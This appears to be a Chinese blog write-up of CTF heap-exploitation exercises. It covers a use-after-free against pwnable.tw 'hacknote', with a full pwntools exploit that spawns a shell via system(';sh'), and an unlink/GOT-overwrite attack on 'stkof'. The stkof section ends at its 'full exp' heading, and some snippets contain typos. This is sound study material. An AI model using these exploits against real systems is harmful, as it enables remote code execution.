<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>uaf及unlink学习</title>
    <url>/2024/03/25/uaf%E5%8F%8Aunlink%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>uaf和unlink学习</p>
<span id="more"></span>

<h2 id="pwnable-hacknote（UAF）"><a href="#pwnable-hacknote（UAF）" class="headerlink" title="pwnable_hacknote（UAF）"></a>pwnable_hacknote（UAF）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      munu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487D4</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;ptr + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80488A5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_8048646</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = sub_804862B;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">int</span>)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;ptr + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804862B</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>fastbin结构</li>
</ul>
<p><img src="https://s2.loli.net/2024/03/25/ORNlTjLSePfXhD9.png" alt="image-20240310220012664.png"></p>
<ul>
<li>第一步，要泄露题目libc</li>
</ul>
<p>#构造函数方便后面攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pri</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>然后泄露libc</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="number">16</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(puts_got))</span><br><span class="line">pri(<span class="number">0</span>)</span><br><span class="line">addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base=addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">print(hex(base))</span><br></pre></td></tr></table></figure>



<ul>
<li>最后利用uaf将system写入程序</li>
<li>这里用;是因为</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804862B</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>));<span class="comment">// 这里会自动后移，但system函数不会，所以用;分隔命令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;;sh&#x27;</span>)</span><br><span class="line">pri(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;hacknote1&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造函数方便后面攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pri</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;libc_32.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./hacknote1&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏puts_got</span></span><br><span class="line">add(<span class="number">16</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(puts_got))</span><br><span class="line">pri(<span class="number">0</span>)</span><br><span class="line">addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base=addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#向程序写入system和binsh</span></span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;;sh&#x27;</span>)</span><br><span class="line">pri(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="stkof-unlink"><a href="#stkof-unlink" class="headerlink" title="stkof(unlink)"></a>stkof(unlink)</h2><p><a href="https://blog.csdn.net/qq_33976344/article/details/119929139">参考</a></p>
<p><a href="https://www.secpulse.com/archives/115388.html">参考2</a></p>
<p><img src="https://s2.loli.net/2024/03/25/apqwrBmGlbUiSvo.png" alt="image-20240321185822816.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">malloc_con</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(s);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  (&amp;yy)[++dword_602100] = v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dword_602100);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v1 = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;yy)[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>((&amp;yy)[v1]);</span><br><span class="line">  (&amp;yy)[v1] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v2 = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;yy)[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  n = atoll(s);</span><br><span class="line">  ptr = (&amp;yy)[v2];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    n -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( n )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( fgets(nptr, <span class="number">10</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = edit();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = del();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = sub_400BA9();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = malloc_con();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="number">-1</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>

<p>edit函数处存在溢出(如下n可由用户决定)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    n -= i;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>堆块起始位置如下</p>
<p><img src="https://s2.loli.net/2024/03/25/btpPj12wheJ3i5C.png" alt="image-20240318211459353.png"></p>
<p>先构造函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;OK\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,context</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size)</span><br><span class="line">    p.send(context)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;OK\n&quot;</span>)</span><br><span class="line">          </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">	p.sendline(index)</span><br></pre></td></tr></table></figure>

<p>然后开始构造执行以下步骤</p>
<ul>
<li><p>申请3个堆块</p>
</li>
<li><p>对第二个堆块进行伪造</p>
</li>
<li><p>释放3堆块，使他与前面2堆块unlink</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fd=<span class="number">0x602140</span>+<span class="number">0x10</span>-<span class="number">0x18</span></span><br><span class="line">bk=<span class="number">0x602140</span>+<span class="number">0x10</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># 上面+0x10是因为从起始地址往后0，1，分别占8字节，这里其实并没有0，但是会偏移，具体看下面代码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(s);</span><br><span class="line">v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !v2 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">(&amp;yy)[++dword_602100] = v2;</span><br></pre></td></tr></table></figure>

<p>接着构造2堆块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload=payload.ljust(<span class="number">0x50</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x50</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<p>现在的堆分布如下</p>
<p><img src="https://s2.loli.net/2024/03/25/78VCRKLbMnFrHSg.png" alt="image-20240320213610677.png"></p>
<p>释放3堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(3)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>FD&#x3D;P-&gt;fd &#x3D; target addr -0x18(0x602138)</p>
</li>
<li><p>BK&#x3D;P-&gt;bk &#x3D; expect value(0x602140)</p>
</li>
<li><p>FD-&gt;bk &#x3D; BK，即 *(target addr-0x18+0x18)&#x3D;BK&#x3D;expect value 向0x602150(chunk 2)写expect value(0x602140)</p>
</li>
<li><p>BK-&gt;fd &#x3D; FD，即 *(expect value +0x10) &#x3D; FD &#x3D; target addr-0x18, 向0x602150 写0x602138</p>
</li>
</ul>
<p>上面步骤完成后</p>
<p>就已经修改了原来2堆块地址为 0x602138</p>
<p>那么接下来edit2，就可以向0x602138写入内容</p>
<p>先向堆内写入free_got，然后修改为puts_plt，泄露地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">    <span class="comment">#free-chunk1</span></span><br><span class="line">    <span class="comment">#puts-chunk2</span></span><br><span class="line">    <span class="comment">#atoi-chunk3</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload=p64(puts_plt)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(paylaod),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>然后</p>
<ul>
<li>修改free函数got表指向puts，泄露puts_got，拿到libc基地址，拿到system函数地址</li>
<li>修改atoi函数got表指向system，输入binsh，就可以getshell</li>
</ul>
<p>完整exp</p>
